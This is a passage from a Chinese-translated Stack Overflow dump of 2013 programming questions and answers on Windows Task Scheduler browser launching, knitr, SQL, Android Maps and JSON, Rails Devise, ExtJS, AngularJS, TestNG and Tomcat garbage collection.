                td.Settings.DeleteExpiredTaskAfter = new TimeSpan(0,0,0,30);
                ts.RootFolder.RegisterTaskDefinition("URL Launch", td, TaskCreation.CreateOrUpdate, null, null, TaskLogonType.InteractiveToken);

            }

    } 
```

这是我的虚拟可执行文件的代码：

```
static void Main(string[] args)
        {
            if(args.Length<=1)
                return;

            string sCmd = args[0];
            string sArg = args[1];

            if(string.IsNullOrEmpty(sCmd)||string.IsNullOrEmpty(sArg))
                return;

            switch (sCmd)
            {
                case "-w":
                    {
                        Process prs = Process.Start(sArg);                        
                    }
                    break;
            }

        } 
```

这种方法是有效的，浏览器确实是在非提升状态下启动的，我可以通过检查 Windows 8 任务管理器中的提升列来确认这一点。

这里唯一的细微差别是浏览器没有作为最顶部的窗口启动，它在后台运行，我认为这与它通过任务调度程序运行的事实有关。

这给我带来了问题，尤其是现代 UI 浏览器，因为在启动页面时 Windows 不会切换到它们。我可以看到该页面已在 Chrome 中成功启动，例如，在 Windows 8 模式下运行时，但它没有切换到浏览器这一事实违背了此解决方法的全部目的。

我考虑过使用`SetForegroundWindow`但遗憾的是运行一个 URL，如上面的示例或通过 explorer.exe，Process.Start 返回`null`。

我想知道是否有人可以帮助我解决这个问题并能够在前台运行浏览器。

问候

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T12:21:26.000

我已经能够用一种非常简单的方法解决这个问题。

只需将快捷方式文件写入 TempFolder 之类的地方，然后通过 explorer.exe 执行它，如下所示：

```
public static void GoURL(string url)
{
 string sysPath = Environment.GetFolderPath(Environment.SpecialFolder.System);
                string ExplorerPath = Path.Combine(Directory.GetParent(sysPath).FullName,
                                                      "explorer.exe");
                string TempDir = Environment.GetFolderPath(Environment.SpecialFolder.InternetCache);
                string shortcutPath = Path.Combine(TempDir, "Mylink.url");
                urlShortcutToTemp(url, shortcutPath);
                System.Diagnostics.Process.Start(ExplorerPath, shortcutPath);
}

private static void urlShortcutToTemp(string linkUrl, string shortcutPath)
        {
            using (StreamWriter writer = new StreamWriter(shortcutPath))
            {
                writer.WriteLine("[InternetShortcut]");
                writer.WriteLine("URL=" + linkUrl);
                writer.Flush();
            }
        } 
```

相同的解决方案可以应用于具有 lnk 快捷方式的可执行文件。

# r - 使用 knitr 使 R 块与文本一致

> ID：16184962
> 
> 赞同：0
> 
> 时间：2013-04-24T06:34:28.500
> 
> 标签：r, syntax-highlighting, knitr

如何使 R 代码（R 块）与我的文本内联？

例子：

***请使用 install.packages("ISwR") 安装软件包***

因此， install.packages("ISwR") 使用 knitr 自动突出显示为 R 块？换句话说，我希望 R 代码与我的文本在同一行。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-24T06:57:47.390

在[亿辉的建议下](https://groups.google.com/forum/?fromgroups=#!topic/knitr/DTTYdjwqrQ8)，

```
\documentclass{article} 
<<setup, include=FALSE>>= 
knit_hooks$set(inline = function(x) { 
  if (is.numeric(x)) return(knitr:::format_sci(x, 'latex')) 
  knitr:::hi_latex(x) 
}) 
@ 
\begin{document} 

Please install the package by using \Sexpr{'install.packages("ISwR")'}. 

\end{document} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-24T06:57:13.740

如果您希望封装的代码**不**被内联执行，您可以使用 3 个反引号 ```。例如

```
There were ```nrow(cars)``` cars studied 
```

# sql - 试图删除内部 SQL 选择语句

> ID：16184965
> 
> 赞同：3
> 
> 时间：2013-04-24T06:34:40.130
> 
> 标签：sql, select

我正在制作一个我们有电台的音乐播放器。我有一张叫做历史的表。它包含用户喜欢、不喜欢或跳过的歌曲的数据。我们存储一个人喜欢或不喜欢一首歌的所有时间。我们想要获取用户在给定电台中喜欢 (event_type=1) 或不喜欢 (event_type=2) 的所有歌曲的当前快照。

该表具有以下行：

*   `id`（PK int 自动增量）
*   `station_id`(FK 整数)
*   `song_id`(FK 整数)
*   `event_type`（整数，1、2 或 3）

这是我的查询：

```
SELECT song_id, event_type, id 
FROM histories 
WHERE id IN (SELECT MAX(id) AS id 
             FROM histories 
             WHERE station_id = 187 
               AND (event_type=1 OR event_type=2) 
             GROUP BY station_id, song_id)  
ORDER BY id; 
```

有没有办法让这个查询在没有内部选择的情况下运行？我很确定如果没有它，它会运行得更快

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-24T06:37:43.893

你可以`JOIN`改用。像这样的东西：

```
SELECT h1.song_id, h1.event_type, h1.id 
FROM histories AS h1
INNER JOIN
(
   SELECT station_id, song_id, MAX(id) AS MaxId
   FROM histories 
   WHERE station_id = 187 
     AND event_type IN (1, 2) 
   GROUP BY station_id, song_id
)  AS h2  ON h1.station_id = h2.station_id 
         AND h1.song_id    = h2.song_id
         AND h1.id         = h2.maxid
ORDER BY h1.id; 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-24T06:55:51.913

@Mahmoud Gamal 的答案是正确的，您可能可以摆脱一些不需要的条件。

```
SELECT h1.song_id, h1.event_type, h1.id 
FROM histories AS h1
INNER JOIN
(
   SELECT MAX(id) AS MaxId
   FROM histories 
   WHERE station_id = 187 
     AND event_type IN (1, 2) 
   GROUP BY song_id
)  AS h2  ON h1.id = h2.maxid
ORDER BY h1.id; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-24T06:38:15.523

根据您的描述，答案如下：

```
SELECT DISTINCT song_id, event_type, id 
FROM histories 
WHERE station_id = 187 
AND (event_type=1 OR event_type=2) 
ORDER BY id 
```

但你一定是出于某种原因在做 MAX - 为什么？

# android - 安卓谷歌地图apiv2

> ID：16184966
> 
> 赞同：2
> 
> 时间：2013-04-24T06:34:48.483
> 
> 标签：android, google-maps-android-api-2

我想在我的应用程序中实现谷歌地图，但是当我运行我的代码时遇到了一些问题，它给出了一个错误。错误是

> 安装错误：INSTALL_FAILED_MISSING_SHARED_LIBRARY

*   我添加了谷歌`playservices.lib`
*   我也生成了 SHA1 密钥和 API 密钥。

请帮忙。

**mainActivity.java**

```
package com.example.mapdemo;

import com.google.android.gms.common.ConnectionResult;
import com.google.android.gms.common.GooglePlayServicesUtil;
import com.google.android.gms.maps.GoogleMap;
import com.google.android.gms.maps.SupportMapFragment;

import android.app.AlertDialog;
import android.os.Bundle;
import android.support.v4.app.FragmentActivity;
import android.support.v4.app.FragmentManager;
import android.view.Menu;
import android.view.MenuItem;
import android.widget.Toast;

public class MainActivity extends FragmentActivity {

 final int RQS_GooglePlayServices = 1;
 private GoogleMap myMap;

 @Override
 protected void onCreate(Bundle savedInstanceState) {
  super.onCreate(savedInstanceState);
  setContentView(R.layout.activity_main);

   FragmentManager myFragmentManager = getSupportFragmentManager();
   SupportMapFragment mySupportMapFragment 
    = (SupportMapFragment)myFragmentManager.findFragmentById(R.id.map);
   myMap = mySupportMapFragment.getMap();

   myMap.setMyLocationEnabled(true);
 }

} 
```

**xml**

```
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    tools:context=".MainActivity" >

    <TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_centerHorizontal="true"
        android:layout_centerVertical="true"
        android:text="@string/hello_world" />
    <fragment
        android:id="@+id/map"
        android:layout_width="match_parent"
        android:layout_height="match_parent"
        class="com.google.android.gms.maps.SupportMapFragment"/>

</RelativeLayout> 
```

**显现**

```
<?xml version="1.0" encoding="utf-8"?>

    <manifest xmlns:android="http://schemas.android.com/apk/res/android"
        package="com.example.mapdemo"
        android:versionCode="1"
        android:versionName="1.0" >

        <uses-sdk
            android:minSdkVersion="8"
            android:targetSdkVersion="17" />
        <uses-permission android:name="android.permission.INTERNET"/>
         <uses-permission 
            android:name="com.example.mapdemo.permission.MAPS_RECEIVE"/>
         <uses-permission 
            android:name="com.example.mapdemo.permission.MAPS_RECEIVE"/>
         <uses-permission 
            android:name="com.google.android.providers.gsf.permission.READ_GSERVICES">

         </uses-permission>
         <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
         <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
         <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>

        <uses-feature
            android:glEsVersion="0x00020000"
            android:required="true"/>

        <application
            android:allowBackup="true"
            android:icon="@drawable/ic_launcher"
            android:label="@string/app_name"
            android:theme="@style/AppTheme" >
            <uses-library android:name="com.google.android.maps" />

            <meta-data
    android:name="com.google.android.maps.v2.API_KEY"
    android:value="AIzaSyBVp6mYyD23IrW7POWAvrY2YzL8q3zaYXU"/>
            <activity
                android:name="com.example.mapdemo.MainActivity"
                android:label="@string/app_name" >
                <intent-filter>
                    <action android:name="android.intent.action.MAIN" />

                    <category android:name="android.intent.category.LAUNCHER" />
                </intent-filter>
            </activity>
        </application>

    </manifest> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-24T07:32:20.067

请尝试以下步骤。对我来说，我认为您错过了第 4 步：“添加库 google play”。

```
To add the dependency to Google Play Services into your project
Project -> Properties -> Android -> Library, Add -> google-play-services_lib 
```

# ruby-on-rails - Apache 网络服务器错误

> ID：16184972
> 
> 赞同：0
> 
> 时间：2013-04-24T06:35:14.833
> 
> 标签：ruby-on-rails, ruby-on-rails-3, apache2, passenger

我在插件上运行我的 ruby​​ on rails应用程序`mac os x 10.7`。我的文件如下。`Apache Web Server``Passenger``httpd.conf`

```
LoadModule passenger_module /Users/Ahmad/.rvm/gems/ruby-1.9.3-p392/gems/passenger-3.0.19/ext/apache2/mod_passenger.so
PassengerRoot /Users/Ahmad/.rvm/gems/ruby-1.9.3-p392/gems/passenger-3.0.19
PassengerRuby /Users/Ahmad/.rvm/wrappers/ruby-1.9.3-p392/ruby
NameVirtualHost *:80
<VirtualHost *:80>
  ServerName qchext.local
  # !!! Be sure to point DocumentRoot to 'public'!
  DocumentRoot "/Users/Ahmad/Sites/redbytes_projects/qchext/public"    
  <Directory "/Users/Ahmad/Sites/redbytes_projects/qchext/public">
     # This relaxes Apache security settings.
     AllowOverride all
     # MultiViews must be turned off.
     Options -MultiViews
  </Directory>
</VirtualHost>
ServerName qchext.local 
```

**错误日志**文件

```
[notice] caught SIGTERM, shutting down
[notice] Digest: generating secret for digest authentication ...
[notice] Digest: done
[warn] mod_bonjour: Skipping user 'Ahmad' - no valid index file. 
[notice] Apache/2.2.22 (Unix) Phusion_Passenger/3.0.19 DAV/2 configured -- resuming normal  operations 
```

请指导我做错了什么。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-24T06:43:03.863

The `SIGTERM` you see is used to restart Apache, did you install the latest Apache with `mod_passenger` and not the Apache that comes bundled with OSX (Assuming that this is what you are running RoR on).

# ruby-on-rails - Rails 4：设计和omniauthable错误

> ID：16184974
> 
> 赞同：2
> 
> 时间：2013-04-24T06:35:16.070
> 
> 标签：ruby-on-rails, ruby, devise, omniauth

我在我的 Rails 4 应用程序中使用设计和omniauth。我从这个页面做了所有的动作（来自答案）：

[设计、Omniauth 和 Facebook 集成会话错误](https://stackoverflow.com/questions/11093120/devise-omniauth-and-facebook-integration-session-error)

将此**:omniauthable**添加到此字符串后

```
devise :database_authenticatable, :registerable, :confirmable,
         :recoverable, :rememberable, :trackable, :validatable 
```

，我收到错误：

```
/home/u164/.rvm/gems/ruby-1.9.3-p392/gems/actionpack-4.0.0.beta1/lib/action_dispatch/routing/mapper.rb:193:in `normalize_conditions!': You should not use the `match` method in your router without specifying an HTTP method. (RuntimeError)
If you want to expose your action to GET, use `get` in the router:

  Instead of: match "controller#action"
  Do: get "controller#action"
    from /home/u164/.rvm/gems/ruby-1.9.3-p392/gems/actionpack-4.0.0.beta1/lib/action_dispatch/routing/mapper.rb:64:in `initialize'
    from /home/u164/.rvm/gems/ruby-1.9.3-p392/gems/actionpack-4.0.0.beta1/lib/action_dispatch/routing/mapper.rb:1425:in `new'
    from /home/u164/.rvm/gems/ruby-1.9.3-p392/gems/actionpack-4.0.0.beta1/lib/action_dispatch/routing/mapper.rb:1425:in `add_route'
    from /home/u164/.rvm/gems/ruby-1.9.3-p392/gems/actionpack-4.0.0.beta1/lib/action_dispatch/routing/mapper.rb:1404:in `decomposed_match'
    from /home/u164/.rvm/gems/ruby-1.9.3-p392/gems/actionpack-4.0.0.beta1/lib/action_dispatch/routing/mapper.rb:1386:in `block in match'
    from /home/u164/.rvm/gems/ruby-1.9.3-p392/gems/actionpack-4.0.0.beta1/lib/action_dispatch/routing/mapper.rb:1386:in `each'
    from /home/u164/.rvm/gems/ruby-1.9.3-p392/gems/actionpack-4.0.0.beta1/lib/action_dispatch/routing/mapper.rb:1386:in `match'
    from /home/u164/.rvm/gems/ruby-1.9.3-p392/gems/devise-1.5.4/lib/devise/rails/routes.rb:365:in `devise_omniauth_callback'
    from /home/u164/.rvm/gems/ruby-1.9.3-p392/gems/devise-1.5.4/lib/devise/rails/routes.rb:212:in `block (4 levels) in devise_for'
    from /home/u164/.rvm/gems/ruby-1.9.3-p392/gems/devise-1.5.4/lib/devise/rails/routes.rb:212:in `each'
    from /home/u164/.rvm/gems/ruby-1.9.3-p392/gems/devise-1.5.4/lib/devise/rails/routes.rb:212:in `block (3 levels) in devise_for'
    from /home/u164/.rvm/gems/ruby-1.9.3-p392/gems/devise-1.5.4/lib/devise/rails/routes.rb:376:in `with_devise_exclusive_scope'
    from /home/u164/.rvm/gems/ruby-1.9.3-p392/gems/devise-1.5.4/lib/devise/rails/routes.rb:211:in `block (2 levels) in devise_for'
    from /home/u164/.rvm/gems/ruby-1.9.3-p392/gems/devise-1.5.4/lib/devise/rails/routes.rb:311:in `block in devise_scope'
    from /home/u164/.rvm/gems/ruby-1.9.3-p392/gems/actionpack-4.0.0.beta1/lib/action_dispatch/routing/mapper.rb:833:in `block in constraints'
    from /home/u164/.rvm/gems/ruby-1.9.3-p392/gems/actionpack-4.0.0.beta1/lib/action_dispatch/routing/mapper.rb:716:in `scope'
    from /home/u164/.rvm/gems/ruby-1.9.3-p392/gems/actionpack-4.0.0.beta1/lib/action_dispatch/routing/mapper.rb:833:in `constraints'
    from /home/u164/.rvm/gems/ruby-1.9.3-p392/gems/devise-1.5.4/lib/devise/rails/routes.rb:310:in `devise_scope'
    from /home/u164/.rvm/gems/ruby-1.9.3-p392/gems/devise-1.5.4/lib/devise/rails/routes.rb:209:in `block in devise_for'
    from /home/u164/.rvm/gems/ruby-1.9.3-p392/gems/devise-1.5.4/lib/devise/rails/routes.rb:192:in `each'
    from /home/u164/.rvm/gems/ruby-1.9.3-p392/gems/devise-1.5.4/lib/devise/rails/routes.rb:192:in `devise_for'
    from /home/u164/nikita/projects/domain-inspect/config/routes.rb:2:in `block in <top (required)>'
    from /home/u164/.rvm/gems/ruby-1.9.3-p392/gems/actionpack-4.0.0.beta1/lib/action_dispatch/routing/route_set.rb:320:in `instance_exec'
    from /home/u164/.rvm/gems/ruby-1.9.3-p392/gems/actionpack-4.0.0.beta1/lib/action_dispatch/routing/route_set.rb:320:in `eval_block'
    from /home/u164/.rvm/gems/ruby-1.9.3-p392/gems/actionpack-4.0.0.beta1/lib/action_dispatch/routing/route_set.rb:298:in `draw'
    from /home/u164/nikita/projects/domain-inspect/config/routes.rb:1:in `<top (required)>'
    from /home/u164/.rvm/gems/ruby-1.9.3-p392/gems/activesupport-4.0.0.beta1/lib/active_support/dependencies.rb:222:in `load'
    from /home/u164/.rvm/gems/ruby-1.9.3-p392/gems/activesupport-4.0.0.beta1/lib/active_support/dependencies.rb:222:in `block in load'
    from /home/u164/.rvm/gems/ruby-1.9.3-p392/gems/activesupport-4.0.0.beta1/lib/active_support/dependencies.rb:213:in `load_dependency'
    from /home/u164/.rvm/gems/ruby-1.9.3-p392/gems/activesupport-4.0.0.beta1/lib/active_support/dependencies.rb:222:in `load'
    from /home/u164/.rvm/gems/ruby-1.9.3-p392/gems/railties-4.0.0.beta1/lib/rails/application/routes_reloader.rb:40:in `block in load_paths'
    from /home/u164/.rvm/gems/ruby-1.9.3-p392/gems/railties-4.0.0.beta1/lib/rails/application/routes_reloader.rb:40:in `each'
    from /home/u164/.rvm/gems/ruby-1.9.3-p392/gems/railties-4.0.0.beta1/lib/rails/application/routes_reloader.rb:40:in `load_paths'
    from /home/u164/.rvm/gems/ruby-1.9.3-p392/gems/railties-4.0.0.beta1/lib/rails/application/routes_reloader.rb:16:in `reload!'
    from /home/u164/.rvm/gems/ruby-1.9.3-p392/gems/railties-4.0.0.beta1/lib/rails/application/routes_reloader.rb:26:in `block in updater'
    from /home/u164/.rvm/gems/ruby-1.9.3-p392/gems/activesupport-4.0.0.beta1/lib/active_support/file_update_checker.rb:75:in `call'
    from /home/u164/.rvm/gems/ruby-1.9.3-p392/gems/activesupport-4.0.0.beta1/lib/active_support/file_update_checker.rb:75:in `execute'
    from /home/u164/.rvm/gems/ruby-1.9.3-p392/gems/railties-4.0.0.beta1/lib/rails/application/routes_reloader.rb:27:in `updater'
    from /home/u164/.rvm/gems/ruby-1.9.3-p392/gems/railties-4.0.0.beta1/lib/rails/application/routes_reloader.rb:7:in `execute_if_updated'
    from /home/u164/.rvm/gems/ruby-1.9.3-p392/gems/railties-4.0.0.beta1/lib/rails/application/finisher.rb:69:in `block in <module:Finisher>'
    from /home/u164/.rvm/gems/ruby-1.9.3-p392/gems/railties-4.0.0.beta1/lib/rails/initializable.rb:30:in `instance_exec'
    from /home/u164/.rvm/gems/ruby-1.9.3-p392/gems/railties-4.0.0.beta1/lib/rails/initializable.rb:30:in `run'
    from /home/u164/.rvm/gems/ruby-1.9.3-p392/gems/railties-4.0.0.beta1/lib/rails/initializable.rb:55:in `block in run_initializers'
    from /home/u164/.rvm/rubies/ruby-1.9.3-p392/lib/ruby/1.9.1/tsort.rb:150:in `block in tsort_each'
    from /home/u164/.rvm/rubies/ruby-1.9.3-p392/lib/ruby/1.9.1/tsort.rb:183:in `block (2 levels) in each_strongly_connected_component'
    from /home/u164/.rvm/rubies/ruby-1.9.3-p392/lib/ruby/1.9.1/tsort.rb:219:in `each_strongly_connected_component_from'
    from /home/u164/.rvm/rubies/ruby-1.9.3-p392/lib/ruby/1.9.1/tsort.rb:182:in `block in each_strongly_connected_component'
    from /home/u164/.rvm/rubies/ruby-1.9.3-p392/lib/ruby/1.9.1/tsort.rb:180:in `each'
    from /home/u164/.rvm/rubies/ruby-1.9.3-p392/lib/ruby/1.9.1/tsort.rb:180:in `each_strongly_connected_component'
    from /home/u164/.rvm/rubies/ruby-1.9.3-p392/lib/ruby/1.9.1/tsort.rb:148:in `tsort_each'
    from /home/u164/.rvm/gems/ruby-1.9.3-p392/gems/railties-4.0.0.beta1/lib/rails/initializable.rb:54:in `run_initializers'
    from /home/u164/.rvm/gems/ruby-1.9.3-p392/gems/railties-4.0.0.beta1/lib/rails/application.rb:213:in `initialize!'
    from /home/u164/.rvm/gems/ruby-1.9.3-p392/gems/railties-4.0.0.beta1/lib/rails/railtie/configurable.rb:30:in `method_missing'
    from /home/u164/nikita/projects/domain-inspect/config/environment.rb:5:in `<top (required)>'
    from /home/u164/.rvm/gems/ruby-1.9.3-p392/gems/activesupport-4.0.0.beta1/lib/active_support/dependencies.rb:228:in `require'
    from /home/u164/.rvm/gems/ruby-1.9.3-p392/gems/activesupport-4.0.0.beta1/lib/active_support/dependencies.rb:228:in `block in require'
    from /home/u164/.rvm/gems/ruby-1.9.3-p392/gems/activesupport-4.0.0.beta1/lib/active_support/dependencies.rb:213:in `load_dependency'
    from /home/u164/.rvm/gems/ruby-1.9.3-p392/gems/activesupport-4.0.0.beta1/lib/active_support/dependencies.rb:228:in `require'
    from /home/u164/nikita/projects/domain-inspect/config.ru:3:in `block in <main>'
    from /home/u164/.rvm/gems/ruby-1.9.3-p392/gems/rack-1.5.2/lib/rack/builder.rb:55:in `instance_eval'
    from /home/u164/.rvm/gems/ruby-1.9.3-p392/gems/rack-1.5.2/lib/rack/builder.rb:55:in `initialize'
    from /home/u164/nikita/projects/domain-inspect/config.ru:in `new'
    from /home/u164/nikita/projects/domain-inspect/config.ru:in `<main>'
    from /home/u164/.rvm/gems/ruby-1.9.3-p392/gems/rack-1.5.2/lib/rack/builder.rb:49:in `eval'
    from /home/u164/.rvm/gems/ruby-1.9.3-p392/gems/rack-1.5.2/lib/rack/builder.rb:49:in `new_from_string'
    from /home/u164/.rvm/gems/ruby-1.9.3-p392/gems/rack-1.5.2/lib/rack/builder.rb:40:in `parse_file'
    from /home/u164/.rvm/gems/ruby-1.9.3-p392/gems/rack-1.5.2/lib/rack/server.rb:277:in `build_app_and_options_from_config'
    from /home/u164/.rvm/gems/ruby-1.9.3-p392/gems/rack-1.5.2/lib/rack/server.rb:199:in `app'
    from /home/u164/.rvm/gems/ruby-1.9.3-p392/gems/railties-4.0.0.beta1/lib/rails/commands/server.rb:46:in `app'
    from /home/u164/.rvm/gems/ruby-1.9.3-p392/gems/rack-1.5.2/lib/rack/server.rb:314:in `wrapped_app'
    from /home/u164/.rvm/gems/ruby-1.9.3-p392/gems/railties-4.0.0.beta1/lib/rails/commands/server.rb:71:in `start'
    from /home/u164/.rvm/gems/ruby-1.9.3-p392/gems/railties-4.0.0.beta1/lib/rails/commands.rb:78:in `block in <top (required)>'
    from /home/u164/.rvm/gems/ruby-1.9.3-p392/gems/railties-4.0.0.beta1/lib/rails/commands.rb:73:in `tap'
    from /home/u164/.rvm/gems/ruby-1.9.3-p392/gems/railties-4.0.0.beta1/lib/rails/commands.rb:73:in `<top (required)>'
    from bin/rails:4:in `require'
    from bin/rails:4:in `<main>' 
```

我应该怎么办？或者现在有办法在 Rail 4 应用程序中使用设计？

**更新 1**

这是我的路线.rb

```
DomainInspect::Application.routes.draw do
  devise_for :users, :controllers => { :omniauth_callbacks => "users/omniauth_callbacks" ,:registrations => "registrations" }
  root :to => 'pages#main'
  resources :users, only: [:show, :edit, :update]
  resources :domains
end 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-05-01T13:15:28.513

[最新版本的设计（在撰写本文时为 v2.2.3](http://rubygems.org/gems/devise/versions) ）当前不支持 Rails 4 。但是，当前[有一个活动的拉取请求打开。](https://github.com/plataformatec/devise/pull/2376)

因此，在它被合并并发布到野外之前，您可以`Gemfile`将它与以下内容一起使用：

```
gem 'devise', :github => 'plataformatec/devise', :branch => 'rails4' 
```

# extjs - ExtJS4: Accessing global variables from Ext.Application

> ID：16184981
> 
> 赞同：3
> 
> 时间：2013-04-24T06:35:44.357
> 
> 标签：extjs, extjs4

I want to load some application specific settings and save them as global variables when the application is loaded. I have found how to create and access global variable [here](https://stackoverflow.com/questions/11615277/setting-and-accessing-global-variables).

This is how my `app.js` looks like:

```
Ext.application({
    stores: [
        ...
    ],
    views: [
        ...
    ],
    autoCreateViewport: true,
    name: 'MyApp',
    controllers: [
        'DefaultController'
    ],

    launch: function() {
        ...
    }
}); 
```

Is it possible to set these variables inside `launch: function()` block? If not, are there any alternatives?

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-24T08:41:08.180

You can also create a singleton:

```
Ext.define('MyApp.util.Utilities', {
     singleton: true,

     myGlobal: 1
}); 
```

in your app:

```
Ext.application({
    stores: [
        ...
    ],
    views: [
        ...
    ],
    autoCreateViewport: true,
    name: 'MyApp',
    controllers: [
        'DefaultController'
    ],

    requires: ['MyApp.util.Utilities'], //Don't forget to require your class

    launch: function() {
        MyApp.util.Utilities.myGlobal = 2; //variables in singleton are auto static.
    }
}); 
```

# angularjs - 为什么在类属性中使用插值时我的指令（限制：'C'）没有被放入？

> ID：16184984
> 
> 赞同：2
> 
> 时间：2013-04-24T06:35:47.680
> 
> 标签：angularjs, angularjs-directive

我有一些指令都是由类属性 ( `restrict: 'C'`) 触发的。我希望触发的指令是动态的，所以我尝试`{{}}`在类属性中使用。但是，这不会按预期触发指令。看到这个小提琴：http: [//jsfiddle.net/ScGKy/](http://jsfiddle.net/ScGKy/)

当我尝试在类上没有任何插值的情况下使用该指令时，它工作正常。但是，一旦我尝试`{{}}`在课堂内使用，它就不再起作用了。从 CSS 可以看出，它正确设置了类名，但没有触发指令。我不能使用这样的类指令有什么原因吗？

# java - 有没有办法将 javadoc 集成到 TestNG 报告中

> ID：16184990
> 
> 赞同：0
> 
> 时间：2013-04-24T06:36:17.967
> 
> 标签：java, javadoc, testng

有人可以让我知道是否有办法将测试方法的 javadoc 集成到 TestNG 报告中？

我已经用谷歌搜索了这个主题并在这里搜索，但到目前为止没有太多有用的信息。

谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-24T09:53:43.400

换句话说，您想要：

1.  “以编程方式提取 javadoc 条目”和

2.  在报告中使用它们。

谷歌搜索 1\. 产生[http://eubauer.de/kingsware/2010/12/19/access-javadoc-programmatically/](http://eubauer.de/kingsware/2010/12/19/access-javadoc-programmatically/)

2\. 嗯，很简单，使用 TestNG [Reporter](http://testng.org/javadoc/org/testng/Reporter.html)。

此外，您可能更喜欢`description`参数而`@Test`不是注释，这将使您免于实现 1\. 部分，但这可能不是您想要的。

# java - 什么是tomcat默认GC选项？

> ID：16184991
> 
> 赞同：4
> 
> 时间：2013-04-24T06:36:21.957
> 
> 标签：java, tomcat, garbage-collection

在`catalina.sh`我`JAVA_OPTS`这样设置。

```
JAVA_OPTS="-server -Xms2048m -Xmx2048m" 
```

在这种情况下，默认`GC`选项是什么？

我认为默认选项是串行 GC。`(-XX:+UseSerialGC)`

谢谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-24T10:35:44.857

[这篇文章](http://docs.oracle.com/javase/6/docs/technotes/guides/vm/gc-ergonomics.html)说：

> 在运行服务器 VM 的服务器级机器上，垃圾收集器 (GC) 已从以前的串行收集器 (-XX:+UseSerialGC) 更改为并行收集器 (-XX:+UseParallelGC)。您可以通过使用 java 命令的 -XX:+UseSerialGC 命令行选项来覆盖此默认值。

当您强制使用服务器 VM`-server`时，这也适用于您。

您始终可以通过 JMX 使用 JConsole 仔细检查这一点。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-24T07:48:18.647

除非 Tomcat 设置不同的东西，否则它与 JVM 的默认设置相同。

# android - org.json.JSONException：java.lang.String 类型的值 var 无法转换为 JSONObject

> ID：16184993
> 
> 赞同：1
> 
> 时间：2013-04-24T06:36:34.640
> 
> 标签：android, json

我正在尝试解析 JSON 并显示该错误。我使用另一个 JSON url 测试了我的代码，它工作正常。以下是我的代码详细信息，

URL - [JSON URL](http://ads.mocean.mobi/ad?site=38206&zone=156431&type=2&size_x=57&size_y=57&count=5&ua=Mozilla/5.0%20%28Windows%20NT%206.2;%20WOW64%29%20AppleWebKit/537.22%20%28KHTML,%20like%20Gecko%29%20Chrome/25.0.1364.152%20Safari/537.22%20117.223.16.66&jsvar=test&type=2&key=6)

## MainActivity.java

```
public class Home extends Activity {
    // url to make request
    private static String url = "http://ads.mocean.mobi/ad?site=38206&zone=156431&type=2&size_x=57&size_y=57&count=5&ua=Mozilla/5.0%20(Windows%20NT%206.2;%20WOW64)%20AppleWebKit/537.22%20(KHTML,%20like%20Gecko)%20Chrome/25.0.1364.152%20Safari/537.22%20117.223.16.66&jsvar=test&type=2&key=6";

    // JSON Node names
    private static final String APP_ARRAYNAME = "var test ";
    private static final String APP_URL = "url";
    private static final String APP_NAME = "text";
    private static final String APP_IMAGE = "img";
    private static final String IMAGE_TYPE = "type";
    private static final String APP_TRACK = "track";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        // TODO Auto-generated method stub
        super.onCreate(savedInstanceState);
        this.requestWindowFeature(Window.FEATURE_NO_TITLE);
        setContentView(R.layout.home);  
        if (Utils.isNetworkAvailable(Home.this)) {
            new MyTask().execute(url);
        } else {
            showToast("No Network Connection!!!");
        }
    }

    class MyTask extends AsyncTask<String, Void, String> {
        ProgressDialog pDialog;
        @Override
        protected void onPreExecute() {
            super.onPreExecute();
            pDialog = new ProgressDialog(Home.this);
            pDialog.setMessage("Loading...");
            pDialog.setCancelable(false);
            pDialog.show();
        }

        @Override
        protected String doInBackground(String... params) { 
            return Utils.getJSONString(params[0]);
        }

        @Override
        protected void onPostExecute(String result) {
            super.onPostExecute(result);
            if (null != pDialog && pDialog.isShowing()) {
                pDialog.dismiss();
            }
            if (null == result || result.length() == 0) {
                showToast("No data found from web!!!");
                //Home.this.finish();
            } else {
                try {
                    JSONObject mainJson = new JSONObject(result);
                    //JSONArray jsonArray = mainJson.getJSONArray(ARRAY_NAME);
                    JSONArray jsonArray = mainJson.getJSONArray(APP_ARRAYNAME);

                    for (int i = 0; i < jsonArray.length(); i++) {
                        JSONObject c = jsonArray.getJSONObject(i);
                        // System.out.println(c.getInt(ID));
                          System.out.println(c.getString(APP_URL));
                          System.out.println(c.getString(APP_NAME));
                          System.out.println(c.getString(APP_IMAGE));
                        //  System.out.println(c.getInt(AGE));
                          System.out.println(c.getString(IMAGE_TYPE));
                    }
                } catch (JSONException e) {
                    e.printStackTrace();
                }
            }
        }
    }
    public void showToast(String msg) {
        Toast.makeText(Home.this, msg, Toast.LENGTH_LONG).show();
    }
} 
```

## 实用程序.java

```
public class Utils {
    public static String getJSONString(String url) {
        String jsonString = null;
        HttpURLConnection linkConnection = null;
        try {
            URL linkurl = new URL(url);
            linkConnection = (HttpURLConnection) linkurl.openConnection();
            int responseCode = linkConnection.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                InputStream linkinStream = linkConnection.getInputStream();
                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                int j = 0;
                while ((j = linkinStream.read()) != -1) {
                    baos.write(j);
                }
                byte[] data = baos.toByteArray();
                jsonString = new String(data);  
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (linkConnection != null) {
